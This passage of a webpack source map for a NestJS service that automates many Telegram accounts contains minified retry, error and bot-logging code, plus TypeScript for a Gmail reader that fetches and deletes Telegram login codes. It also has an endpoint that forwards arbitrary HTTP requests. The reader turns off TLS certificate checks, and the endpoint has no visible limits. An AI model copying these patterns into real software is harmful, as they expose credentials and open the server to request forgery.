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","sources":[".././src/IMap/IMap.ts",".././src/app.controller.ts",".././src/app.module.ts",".././src/app.service.ts",".././src/cloudinary.ts",".././src/components/ConfigurationInit/configuration.schema.ts",".././src/components/ConfigurationInit/init.controller.ts",".././src/components/ConfigurationInit/init.module.ts",".././src/components/ConfigurationInit/init.service.ts",".././src/components/Telegram/Telegram.controller.ts",".././src/components/Telegram/Telegram.module.ts",".././src/components/Telegram/Telegram.service.ts",".././src/components/Telegram/TelegramManager.ts",".././src/components/Telegram/config/telegram-validation.config.ts",".././src/components/Telegram/dto/batch-operations.dto.ts",".././src/components/Telegram/dto/common-responses.dto.ts",".././src/components/Telegram/dto/contact-management.dto.ts",".././src/components/Telegram/dto/create-bot.dto.ts",".././src/components/Telegram/dto/create-chat-folder.dto.ts",".././src/components/Telegram/dto/delete-chat.dto.ts",".././src/components/Telegram/dto/group-operations.dto.ts",".././src/components/Telegram/dto/index.ts",".././src/components/Telegram/dto/media-operations.dto.ts",".././src/components/Telegram/dto/message-search.dto.ts",".././src/components/Telegram/dto/metadata-operations.dto.ts",".././src/components/Telegram/dto/profile-settings.dto.ts",".././src/components/Telegram/dto/schedule-operations.dto.ts",".././src/components/Telegram/dto/send-message.dto.ts",".././src/components/Telegram/dto/update-username.dto.ts",".././src/components/Telegram/dto/view-once-media.dto.ts",".././src/components/Telegram/utils/connection-manager.ts",".././src/components/Telegram/utils/telegram-logger.ts",".././src/components/TgSignup/TgSignup.module.ts",".././src/components/TgSignup/TgSignup.service.ts",".././src/components/TgSignup/dto/tg-signup.dto.ts",".././src/components/TgSignup/tgSignup.controller.ts",".././src/components/active-channels/active-channels.controller.ts",".././src/components/active-channels/active-channels.module.ts",".././src/components/active-channels/active-channels.service.ts",".././src/components/active-channels/dto/add-reaction.dto.ts",".././src/components/active-channels/dto/create-active-channel.dto.ts",".././src/components/active-channels/dto/update-active-channel.dto.ts",".././src/components/active-channels/schemas/active-channel.schema.ts",".././src/components/archived-clients/archived-client.controller.ts",".././src/components/archived-clients/archived-client.module.ts",".././src/components/archived-clients/archived-client.service.ts",".././src/components/buffer-clients/buffer-client.controller.ts",".././src/components/buffer-clients/buffer-client.module.ts",".././src/components/buffer-clients/buffer-client.service.ts",".././src/components/buffer-clients/dto/create-buffer-client.dto.ts",".././src/components/buffer-clients/dto/search-buffer- client.dto.ts",".././src/components/buffer-clients/dto/update-buffer-client.dto.ts",".././src/components/buffer-clients/schemas/buffer-client.schema.ts",".././src/components/builds/build.controller.ts",".././src/components/builds/build.module.ts",".././src/components/builds/build.service.ts",".././src/components/builds/builds.schema.ts",".././src/components/channels/channels.controller.ts",".././src/components/channels/channels.module.ts",".././src/components/channels/channels.service.ts",".././src/components/channels/dto/create-channel.dto.ts",".././src/components/channels/dto/search-channel.dto.ts",".././src/components/channels/dto/update-channel.dto.ts",".././src/components/channels/schemas/channel.schema.ts",".././src/components/clients/client.controller.ts",".././src/components/clients/client.module.ts",".././src/components/clients/client.service.ts",".././src/components/clients/dto/create-client.dto.ts",".././src/components/clients/dto/search-client.dto.ts",".././src/components/clients/dto/update-client.dto.ts",".././src/components/clients/schemas/client.schema.ts",".././src/components/n-point/npoint.controller.ts",".././src/components/n-point/npoint.module.ts",".././src/components/n-point/npoint.service.ts",".././src/components/promote-clients/dto/create-promote-client.dto.ts",".././src/components/promote-clients/dto/search-promote-client.dto.ts",".././src/components/promote-clients/dto/update-promote-client.dto.ts",".././src/components/promote-clients/promote-client.controller.ts",".././src/components/promote-clients/promote-client.module.ts",".././src/components/promote-clients/promote-client.service.ts",".././src/components/promote-clients/schemas/promote-client.schema.ts",".././src/components/promote-msgs/promote-msgs.controller.ts",".././src/components/promote-msgs/promote-msgs.module.ts",".././src/components/promote-msgs/promote-msgs.schema.ts",".././src/components/promote-msgs/promote-msgs.service.ts",".././src/components/promote-stats/dto/create-promote-stat.dto.ts",".././src/components/promote-stats/dto/update-promote-stat.dto.ts",".././src/components/promote-stats/promote-stat.controller.ts",".././src/components/promote-stats/promote-stat.module.ts",".././src/components/promote-stats/promote-stat.service.ts",".././src/components/promote-stats/schemas/promote-stat.schema.ts",".././src/components/shared/dto/execute-request.dto.ts",".././src/components/stats/create-stat.dto.ts",".././src/components/stats/stat.controller.ts",".././src/components/stats/stat.module.ts",".././src/components/stats/stat.schema.ts",".././src/components/stats/stat.service.ts",".././src/components/stats/update-stat.dto.ts",".././src/components/stats2/create-stat2.dto.ts",".././src/components/stats2/stat2.controller.ts",".././src/components/stats2/stat2.module.ts",".././src/components/stats2/stat2.schema.ts",".././src/components/stats2/stat2.service.ts",".././src/components/stats2/update-stat2.dto.ts",".././src/components/timestamps/timestamp.controller.ts",".././src/components/timestamps/timestamp.module.ts",".././src/components/timestamps/timestamp.service.ts",".././src/components/timestamps/timestamps.schema.ts",".././src/components/transactions/dto/create-transaction.dto.ts",".././src/components/transactions/dto/update-transaction.dto.ts",".././src/components/transactions/schemas/transaction.schema.ts",".././src/components/transactions/transaction.controller.ts",".././src/components/transactions/transaction.module.ts",".././src/components/transactions/transaction.service.ts",".././src/components/upi-ids/upi-ids.controller.ts",".././src/components/upi-ids/upi-ids.module.ts",".././src/components/upi-ids/upi-ids.schema.ts",".././src/components/upi-ids/upi-ids.service.ts",".././src/components/user-data/dto/create-user-data.dto.ts",".././src/components/user-data/dto/search-user-data.dto.ts",".././src/components/user-data/dto/update-user-data.dto.ts",".././src/components/user-data/schemas/user-data.schema.ts",".././src/components/user-data/user-data.controller.ts",".././src/components/user-data/user-data.module.ts",".././src/components/user-data/user-data.service.ts",".././src/components/users/dto/create-user.dto.ts",".././src/components/users/dto/search-user.dto.ts",".././src/components/users/dto/update-user.dto.ts",".././src/components/users/schemas/user.schema.ts",".././src/components/users/users.controller.ts",".././src/components/users/users.module.ts",".././src/components/users/users.service.ts",".././src/interfaces/telegram.ts",".././src/main.ts",".././src/middlewares/logger.middleware.ts",".././src/utils.ts",".././src/utils/TelegramBots.config.ts",".././src/utils/fetchWithTimeout.ts",".././src/utils/logbots.ts",".././src/utils/parseError.ts","../external commonjs \"@nestjs/common\"","../external commonjs \"@nestjs/config\"","../external commonjs \"@nestjs/core\"","../external commonjs \"@nestjs/mapped-types\"","../external commonjs \"@nestjs/mongoose\"","../external commonjs \"@nestjs/platform-express\"","../external commonjs \"@nestjs/swagger\"","../external commonjs \"adm-zip\"","../external commonjs \"axios\"","../external commonjs \"big-integer\"","../external commonjs \"class-transformer\"","../external commonjs \"class-validator\"","../external commonjs \"cloudinary\"","../external commonjs \"imap\"","../external commonjs \"mongoose\"","../external commonjs \"multer\"","../external commonjs \"telegram\"","../external commonjs \"telegram/Helpers\"","../external commonjs \"telegram/Password\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events\"","../external commonjs \"telegram/extensions/Logger\"","../external commonjs \"telegram/sessions\"","../external commonjs \"telegram/tl\"","../external node-commonjs \"crypto\"","../external node-commonjs \"fs\"","../external node-commonjs \"path\"","../webpack/bootstrap","../webpack/startup"],"sourcesContent":["import Imap from 'imap';\nimport { fetchNumbersFromString, sleep } from '../utils';\nimport { parseError } from '../utils/parseError';\n\nexport class MailReader {\n    private static instance: MailReader;\n    private imap: Imap;\n    private isReady: boolean = false;\n    private result: string = '';\n\n    private constructor() {\n        this.imap = new Imap({\n            user: process.env.GMAIL_ADD || '',\n            password: process.env.GMAIL_PASS || '',\n            host: 'imap.gmail.com',\n            port: 993,\n            tls: true,\n            tlsOptions: {\n                rejectUnauthorized: false,\n            },\n        });\n\n        this.imap.on('ready', () => {\n            console.log('Mail is Ready');\n            this.isReady = true;\n        });\n\n        this.imap.on('error', (err: Error) => {\n            console.error('SomeError:', err);\n            this.isReady = false;\n        });\n\n        this.imap.on('end', () => {\n            console.log('Connection ended');\n            this.isReady = false;\n        });\n    }\n\n    public static getInstance(): MailReader {\n        if (!MailReader.instance) {\n            MailReader.instance = new MailReader();\n        }\n        return MailReader.instance;\n    }\n\n    public async connectToMail(): Promise<void> {\n        console.log('Connecting to mail server');\n        try {\n            this.imap.connect();\n            this.isReady = true;\n            console.log('Connected to mail server');\n        } catch (err) {\n            console.error('Error connecting to mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async disconnectFromMail(): Promise<void> {\n        console.log('Disconnecting from mail server');\n        try {\n            this.imap.end();\n            this.isReady = false;\n            console.log('Disconnected from mail server');\n        } catch (err) {\n            console.error('Error disconnecting from mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async isMailReady(): Promise<boolean> {\n        return this.isReady;\n    }\n\n    public async getCode(): Promise<string> {\n        console.log(\"MailReady : \", this.isReady)\n        if (!this.isReady) {\n            console.log(\"Re-Connecting mail server\");\n            await this.connectToMail();\n            await sleep(10000);\n        }\n\n        try {\n            await this.openInbox();\n\n            const searchCriteria = [['FROM', 'noreply@telegram.org']];\n            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };\n            console.log('Inbox Opened');\n\n            const results = await new Promise<any[]>((resolve, reject) => {\n                this.imap.search(searchCriteria, (err, results) => {\n                    if (err) {\n                        console.error('Search error:', parseError(err));\n                        reject(err);\n                    } else {\n                        resolve(results);\n                    }\n                });\n            });\n\n            if (results.length > 0) {\n                console.log('Emails found:', results.length);\n                const length = results.length;\n                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);\n\n                await new Promise<void>((resolve, reject) => {\n                    fetch.on('message', (msg, seqno) => {\n                        const emailData: string[] = [];\n\n                        msg.on('body', (stream, info) => {\n                            let buffer = '';\n                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));\n                            stream.on('end', () => {\n                                if (info.which === 'TEXT') {\n                                    emailData.push(buffer);\n                                }\n                                this.imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\n                                    if (err) reject(err);\n                                    this.imap.expunge((err) => {\n                                        if (err) reject(err);\n                                        console.log('Deleted message');\n                                    });\n                                });\n                            });\n                        });\n\n                        msg.once('end', () => {\n                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);\n                            console.log('EmailDataLength:', emailData.length);\n                            console.log('Mail:', emailData[emailData.length - 1].split('.'));\n                            this.result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);\n                            resolve();\n                        });\n                    });\n\n                    fetch.once('end', () => {\n                        console.log('Fetched mails');\n                        resolve();\n                    });\n                });\n            } else {\n                console.log('No new emails found');\n            }\n\n            console.log('Returning result:', this.result);\n            return this.result;\n        } catch (error) {\n            console.error('Error:', error);\n            this.isReady = false;\n            throw error;\n        }\n    }\n\n    private async openInbox(): Promise<void> {\n        await new Promise<void>((resolve, reject) => {\n            this.imap.openBox('INBOX', false, (err) => {\n                if (err) {\n                    console.error('Open Inbox error:', parseError(err));\n                    reject(err);\n                } else {\n                    console.log('Inbox opened');\n                    resolve();\n                }\n            });\n        });\n    }\n}","import { Controller, Get, Post, Body, ValidationPipe, Logger, Res } from '@nestjs/common';\r\nimport { AppService } from './app.service';\r\nimport { ApiOperation } from '@nestjs/swagger';\r\nimport axios from 'axios';\r\nimport { ExecuteRequestDto } from './components/shared/dto/execute-request.dto';\r\nimport { randomUUID } from 'crypto';\r\nimport { Response } from 'express';\r\n\r\n@Controller()\r\nexport class AppController {\r\n    private logger = new Logger('AppController');\r\n\r\n    constructor(private readonly appService: AppService) {}\r\n\r\n    @Get()\r\n    getHello(): string {\r\n        return this.appService.getHello();\r\n    }\r\n\r\n    @Post('execute-request')\r\n    @ApiOperation({ summary: 'Execute an HTTP request with given details' })\r\n    async executeRequest(\r\n        @Body(new ValidationPipe({ transform: true })) requestDetails: ExecuteRequestDto,\r\n        @Res() res: Response\r\n    ) {\r\n        const requestId = randomUUID();\r\n        const startTime = Date.now();\r\n\r\n        try {\r\n            const {\r\n                url,\r\n                method = 'GET',\r\n                headers = {},\r\n                data,\r\n                params,\r\n                responseType = 'json',\r\n                timeout = 30000,\r\n                followRedirects = true,\r\n                maxRedirects = 5\r\n            } = requestDetails;\r\n\r\n            // Log request details\r\n            this.logger.log({\r\n                message: 'Executing HTTP request',\r\n                requestId,\r\n                details: {\r\n                    url,\r\n                    method,\r\n                    headers: this.sanitizeHeaders(headers),\r\n                    params,\r\n                    responseType,\r\n                    timeout,\r\n                    dataSize: data ? JSON.stringify(data).length : 0\r\n                }\r\n            });\r\n\r\n            const response = await axios({\r\n                url,\r\n                method,\r\n                headers,\r\n                data,\r\n                params,\r\n                responseType,\r\n                timeout,\r\n                maxRedirects: followRedirects ? maxRedirects : 0,\r\n                maxContentLength: Infinity,\r\n                maxBodyLength: Infinity,\r\n                validateStatus: 